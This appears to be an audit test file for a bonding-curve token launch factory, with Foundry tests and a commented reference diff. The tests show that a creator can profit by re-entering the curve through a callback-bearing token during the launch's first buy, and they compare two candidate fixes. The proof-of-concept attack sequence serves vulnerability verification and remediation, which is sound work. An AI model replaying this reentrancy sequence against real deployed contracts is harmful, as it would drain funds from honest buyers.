        // THE CONTROL, and without it this measures a bonding curve rather than an attack: a
        // creator who buys first and sells into the next buyer profits anyway. Same capital, same
        // honest buyer, same exit, no reentrancy — the difference is the finding.
        RealAttacker honest = _arm(RealFirstBuyFactory.Mode.TODAY);
        (address ch, address th) = honest.launch(FIRST + INNER, 0);
        assertFalse(honest.fired(), "the control arm re-entered after all");
        uint256 control = _runToExit(BondingCurve(payable(ch)), th, honest, honest_);

        emit log_named_uint("attacker staked        ", spent);
        emit log_named_uint("attacker recovered     ", recovered);
        emit log_named_uint("control recovered      ", control);
        emit log_named_uint("attack gain, bps of stake", ((recovered - control) * 10_000) / spent);
        assertGt(recovered, spent, "the attack did not pay");
        assertGt(recovered, control, "the reentrancy earned nothing the first buy would not have");

        uint256 bobTokens = IERC20(tokenAddr).balanceOf(BOB);
        vm.startPrank(BOB);
        IERC20(tokenAddr).approve(curveAddr, bobTokens);
        (bool sold,) =
            curveAddr.call(abi.encodeWithSelector(BondingCurve.sell.selector, bobTokens, uint256(0), type(uint256).max));
        vm.stopPrank();
        emit log_named_string("honest buyer could exit", sold ? "YES" : "no");
        emit log_named_uint("honest buyer paid  ", honest_);
        emit log_named_uint("honest buyer got   ", quote.balanceOf(BOB));
        assertLt(quote.balanceOf(BOB), honest_, "the honest buyer did not lose anything");
    }

    // ---------------------------------------------------------------------------- candidate A

    /// @dev A on the real curve, plain callback: solvent to the wei.
    function test_real_clampA_plainCallback_leavesTheCurveSolvent() public {
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.CLAMP);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        BondingCurve c = BondingCurve(payable(curveAddr));

        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(quote.balanceOf(curveAddr), FIRST + INNER, "the curve holds what was really sent");
        assertEq(_shortfall(c), int256(0), "the clamp left the curve insolvent on a plain callback");
    }

    /**
     * @dev And with A in place the attack stops PAYING, which is the test that matters: the same
     *      capital through the same sequence recovers no more than an honest first buy of the same
     *      size would have. The reentrancy has been reduced to an expensive way to split one buy
     *      into two, and the second half pays the anti-sniper tax the first half is exempt from.
     */
    function test_real_clampA_plainCallback_earnsLessThanTheHonestFirstBuy() public {
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.CLAMP);
        uint256 beforeA = quote.balanceOf(address(atk));
        (address ca, address ta) = atk.launch(FIRST, INNER);
        uint256 spentA = beforeA - quote.balanceOf(address(atk));
        uint256 gotA = _runToExit(BondingCurve(payable(ca)), ta, atk, 3_000e6);

        RealAttacker honest = _arm(RealFirstBuyFactory.Mode.CLAMP);
        uint256 beforeH = quote.balanceOf(address(honest));
        (address ch, address th) = honest.launch(FIRST + INNER, 0);
        uint256 spentH = beforeH - quote.balanceOf(address(honest));
        assertFalse(honest.fired(), "the control arm re-entered after all");
        uint256 gotH = _runToExit(BondingCurve(payable(ch)), th, honest, 3_000e6);

        assertEq(spentA, spentH, "the two arms did not stake the same capital");
        emit log_named_uint("recovered, attacked", gotA);
        emit log_named_uint("recovered, control ", gotH);
        assertLt(gotA, gotH, "the reentrancy still earned something under candidate A");
        assertGe(quote.balanceOf(ca), _booked(BondingCurve(payable(ca))), "the attacked market is insolvent");
    }

    /**
     * THE CASE THAT SEPARATES A FROM B, ON LIVE CURVE CODE.
     *
     * Fee-on-transfer AND a sender callback. The clamp pins the measured delta to `firstBuyQuote`,
     * which is more than the outer leg actually delivered, and the curve is left short by exactly
     * the transfer fee on the first buy — permanently, since nothing ever reconciles the two.
     */
    function test_real_clampA_feeOnTransferPlusCallback_leaksExactlyTheTransferFee() public {
        quote.setFee(FEE_BPS, FEESINK);
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.CLAMP);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        BondingCurve c = BondingCurve(payable(curveAddr));

        uint256 fee = (FIRST * FEE_BPS) / 10_000;
        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(_shortfall(c), int256(fee), "candidate A did NOT leak - the review's claim is refuted");
        emit log_named_uint("candidate A residue on the real curve", fee);
    }

    /**
     * @dev And the residue does not wash out. `booked - balance` is conserved by every later trade
     *      — a buy adds the same number to both sides, a sell takes the same number off both — so
     *      the hole opened at launch is still exactly there after honest trading, and it is the
     *      last claimant on the market who finds it. That is why A is not a fix: it converts fund
     *      theft into a smaller, permanent, unattributable shortfall rather than removing it.
     */
    function test_real_clampA_theResidueIsPermanentAndHonestTradingCannotCloseIt() public {
        quote.setFee(FEE_BPS, FEESINK);
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.CLAMP);
        (address curveAddr, address tokenAddr) = atk.launch(FIRST, INNER);
        BondingCurve c = BondingCurve(payable(curveAddr));
        uint256 fee = (FIRST * FEE_BPS) / 10_000;

        vm.warp(vm.getBlockTimestamp() + c.TAX_WINDOW() + 1);
        vm.roll(block.number + 1);

        quote.mint(BOB, 20_000e6);
        vm.startPrank(BOB);
        quote.approve(curveAddr, type(uint256).max);
        c.buyWithToken(3_000e6, 0, type(uint256).max);
        vm.stopPrank();
        assertEq(_shortfall(c), int256(fee), "an honest buy moved the residue");

        atk.sellAll(tokenAddr);
        assertEq(_shortfall(c), int256(fee), "an honest sell moved the residue");

        uint256 bobTokens = IERC20(tokenAddr).balanceOf(BOB);
        vm.startPrank(BOB);
        IERC20(tokenAddr).approve(curveAddr, bobTokens);
        c.sell(bobTokens, 0, type(uint256).max);
        vm.stopPrank();
        assertEq(_shortfall(c), int256(fee), "the residue closed itself");
        assertLt(quote.balanceOf(curveAddr), _booked(c), "the curve came out solvent after all");
    }

    // ---------------------------------------------------------------------------- candidate B

    /**
     * CANDIDATE B'S MECHANISM, ON DEPLOYED CODE.
     *
     * `BondingCurve._pullAndBuy` is the pull candidate B moves `buyFor` to: same balance delta,
     * measured with the curve's own `nonReentrant` held. The identical attack — the identical
     * token, the identical hook, the identical inner call — bounces off it, with and without the
     * transfer fee, and the curve is left having moved nothing.
     *
     * This is what makes B a claim about the CLASS rather than about this instance: the guard is
     * already there and already works; the bug is only that the deployed factory does the transfer
     * outside it.
     */
    function test_real_candidateBsMechanismIsAlreadyImmune_withAndWithoutTheTransferFee() public {
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.TODAY);
        (address curveAddr,) = atk.launch(0, 0); // no first buy, so nothing is attacked at launch
        BondingCurve c = BondingCurve(payable(curveAddr));
        assertFalse(atk.fired(), "there was no first buy to hook");

        // 1. Plain callback, against the curve's own inbound leg.
        atk.rearm(curveAddr, 500e6);
        vm.expectRevert(); // ReentrancyGuardReentrantCall, raised inside the token's callback
        atk.directBuy(500e6);
        assertEq(_booked(c), 0, "a refused reentrant buy still booked something");
        assertEq(quote.balanceOf(curveAddr), 0, "a refused reentrant buy still moved money");

        // 2. The combined case that defeats candidate A. Same result.
        quote.setFee(FEE_BPS, FEESINK);
        atk.rearm(curveAddr, 500e6);
        vm.expectRevert();
        atk.directBuy(500e6);
        assertEq(_booked(c), 0, "a refused reentrant buy still booked something");
        assertEq(quote.balanceOf(curveAddr), 0, "a refused reentrant buy still moved money");

        // 3. And with the hook quiet the same call is an ordinary, solvent, fee-aware buy.
        atk.rearm(curveAddr, 0);
        atk.setArmed(false);
        atk.directBuy(500e6);
        uint256 arrived = 500e6 - (uint256(500e6) * FEE_BPS) / 10_000;
        assertEq(quote.balanceOf(curveAddr), arrived, "the honest buy did not land");
        assertEq(_booked(c), arrived, "the honest buy booked something other than what arrived");
        assertEq(_shortfall(c), int256(0), "the curve's own pull left it insolvent");
    }

    /// @dev Launch already done: warp past the anti-sniper tax, let one honest buyer in, exit.
    function _runToExit(BondingCurve c, address token_, RealAttacker creator, uint256 honest)
        internal
        returns (uint256 recovered)
    {
        vm.warp(vm.getBlockTimestamp() + c.TAX_WINDOW() + 1);
        vm.roll(block.number + 1);
        address buyer = address(uint160(uint256(keccak256(abi.encode(address(c))))));
        quote.mint(buyer, honest);
        vm.startPrank(buyer);
        quote.approve(address(c), type(uint256).max);
        c.buyWithToken(honest, 0, type(uint256).max);
        vm.stopPrank();

        uint256 before = quote.balanceOf(address(creator));
        creator.sellAll(token_);
        recovered = quote.balanceOf(address(creator)) - before;
    }
}

/* =============================================================================================
 *                   THE REFERENCE IMPLEMENTATION — what generation 4 should ship
 * =============================================================================================
 *
 * Candidate B, as the exact diff. Recorded here rather than in `src/` because the deployed
 * contracts are immutable and this file may not touch them.
 *
 * The one design decision inside it worth arguing over: `buyFor` pulls from `recipient` and takes
 * NO separate `payer` parameter, so its signature does not move at all. A `payer` parameter would
 * hand the factory the power to spend any account's allowance TO THIS CURVE on a third party's
 * behalf — and every ordinary trader grants the curve exactly that allowance in order to use
 * `buyWithToken`. Fused, the worst a future factory bug can do is buy a victim tokens with the
 * victim's own money. If a later launch flow ever needs the two split, the consent for it has to
 * come from the payer, never from the factory's word.
 *
 * --- src/BondingCurve.sol -----------------------------------------------------------------
 *
 *      error QuoteIsNative();
 *      error QuoteIsNotNative();
 *  +   /// @dev The launch's first buy pulled in and nothing arrived. Moved here from
 *  +   ///      `DokuFactory` along with the transfer it guards. Same selector, so a client that
 *  +   ///      decodes launch reverts by selector needs no change.
 *  +   error FirstBuyDeliveredNothing();
 *
 *      /// @notice The launch transaction's own buy, for the creator. Factory only.
 *      /// @dev The anti-sniper rate is forced to ZERO here and nowhere else: ... [unchanged]
 *      ///
 *  -   ///      For an ERC-20 quote the factory has already moved `quoteIn` here; it is trusted to,
 *  -   ///      being the one address that initialised this curve.
 *  +   ///      For an ERC-20 quote this function PULLS the money itself and prices the delta it
 *  +   ///      measures — both inside this function's own `nonReentrant`. The factory must never
 *  +   ///      do that transfer on the curve's behalf: no curve function is on the stack while it
 *  +   ///      does, so a quote asset that calls the payer back during `transferFrom` lets the
 *  +   ///      payer re-enter `buyWithToken` between the factory's two balance reads and have the
 *  +   ///      same money booked twice. Clamping the factory's delta to `firstBuyQuote` bounds
 *  +   ///      that lie but does not remove it: on an asset that is BOTH callback-bearing and
 *  +   ///      fee-on-transfer the clamp books the full request against a fee-reduced arrival.
 *  +   ///      See test/audit/Gen4FirstBuyFix.t.sol.
 *  +   ///
 *  +   ///      The payer is the RECIPIENT. No `payer` parameter — see the file above for why.
 *      function buyFor(address recipient, uint256 quoteIn, uint256 minBaseOut, uint256 deadline)
 *          external
 *          payable
 *          nonReentrant
 *          returns (uint256 baseOut)
 *      {
 *          if (msg.sender != factory) revert NotFactory();
 *          if (recipient == address(0)) revert ZeroAddress();
 *  -       uint256 expected = quoteAsset == address(0) ? quoteIn : 0;
 *  -       if (msg.value != expected) revert ValueMismatch(msg.value, expected);
 *  -       return _buy(recipient, quoteIn, minBaseOut, deadline, 0);
 *  +       if (quoteAsset == address(0)) {
 *  +           if (msg.value != quoteIn) revert ValueMismatch(msg.value, quoteIn);
 *  +           return _buy(recipient, quoteIn, minBaseOut, deadline, 0);
 *  +       }
 *  +       if (msg.value != 0) revert ValueMismatch(msg.value, 0);
 *  +       IERC20 q = IERC20(quoteAsset);
 *  +       uint256 held = q.balanceOf(address(this));
 *  +       q.safeTransferFrom(recipient, address(this), quoteIn);
 *  +       uint256 arrived = q.balanceOf(address(this)) - held;
 *  +       if (arrived == 0) revert FirstBuyDeliveredNothing();
 *  +       return _buy(recipient, arrived, minBaseOut, deadline, 0);
 *      }
 *
 * --- src/DokuFactory.sol ------------------------------------------------------------------
 *
 *      import {Clones} from "openzeppelin/proxy/Clones.sol";
 *  -   import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
 *  -   import {SafeERC20} from "openzeppelin/token/ERC20/utils/SafeERC20.sol";
 *      import {Ownable2Step, Ownable} from "openzeppelin/access/Ownable2Step.sol";
 *
 *      contract DokuFactory is Ownable2Step, Pausable {
 *  -       using SafeERC20 for IERC20;
 *
 *  -       /// @dev The launch's first buy transferred in and nothing arrived. See `_firstBuy`.
 *  -       error FirstBuyDeliveredNothing();
 *
 *      function _firstBuy(LaunchParams calldata p, address curve) private {
 *          if (p.firstBuyQuote == 0) return;
 *          BondingCurve c = BondingCurve(payable(curve));
 *  -       if (p.quoteAsset == address(0)) {
 *  -           c.buyFor{value: p.firstBuyQuote}(msg.sender, p.firstBuyQuote, p.firstBuyMinOut, p.deadline);
 *  -       } else {
 *  -           IERC20 q = IERC20(p.quoteAsset);
 *  -           uint256 before = q.balanceOf(curve);
 *  -           q.safeTransferFrom(msg.sender, curve, p.firstBuyQuote);
 *  -           uint256 arrived = q.balanceOf(curve) - before;
 *  -           if (arrived == 0) revert FirstBuyDeliveredNothing();
 *  -           c.buyFor(msg.sender, arrived, p.firstBuyMinOut, p.deadline);
 *  -       }
 *  +       // The factory moves no quote at all now. `buyFor` pulls from the creator inside the
 *  +       // curve's own guard and prices what arrived there, so the measurement window can no
 *  +       // longer be re-entered — the same reason `_pullAndBuy` was already safe. The creator
 *  +       // approves the CURVE, whose address `predictMarket` already answers before the launch.
 *  +       uint256 value = p.quoteAsset == address(0) ? p.firstBuyQuote : 0;
 *  +       c.buyFor{value: value}(msg.sender, p.firstBuyQuote, p.firstBuyMinOut, p.deadline);
 *      }
 *
 * --- src/typescript/frontend/src/lib/launch/submit.ts ---------------------------------------
 *
 *  `curve` is already in scope from the `predictMarket` read at step 2, so this is three
 *  identifiers and the doc comment that explains them.
 *
 *   *   4. **Approve, if the quote is an ERC-20 and there is a first buy** — the **curve**, not
 *   *      the factory. The launch no longer moves the money itself: `buyFor` pulls from the
 *   *      creator inside the curve's own reentrancy guard, which is what stops a callback-bearing
 *   *      quote having the same money booked twice. `predictMarket` above already answers where
 *   *      the curve will be, and the allowance is granted to that address before it has code.
 *   *      NOTE: the allowance cannot be reused across launches — every launch is a new curve — so
 *   *      an ERC-20 first buy costs one approval EVERY time, not once per launcher.
 *
 *  -   approve: encodeLaunchApproval(params.quoteAsset, chain.factory, withMon.minQuoteOut),
 *  +   approve: encodeLaunchApproval(params.quoteAsset, curve, withMon.minQuoteOut),
 *
 *  -   const allowance = await chain.allowance(params.quoteAsset, chain.account, chain.factory);
 *  +   const allowance = await chain.allowance(params.quoteAsset, chain.account, curve);
 *      if (allowance < params.firstBuyQuote) {
 *  -     await chain.approve(params.quoteAsset, chain.factory, params.firstBuyQuote);
 *  +     await chain.approve(params.quoteAsset, curve, params.firstBuyQuote);
 *      }
 *
 * ============================================================================================= */
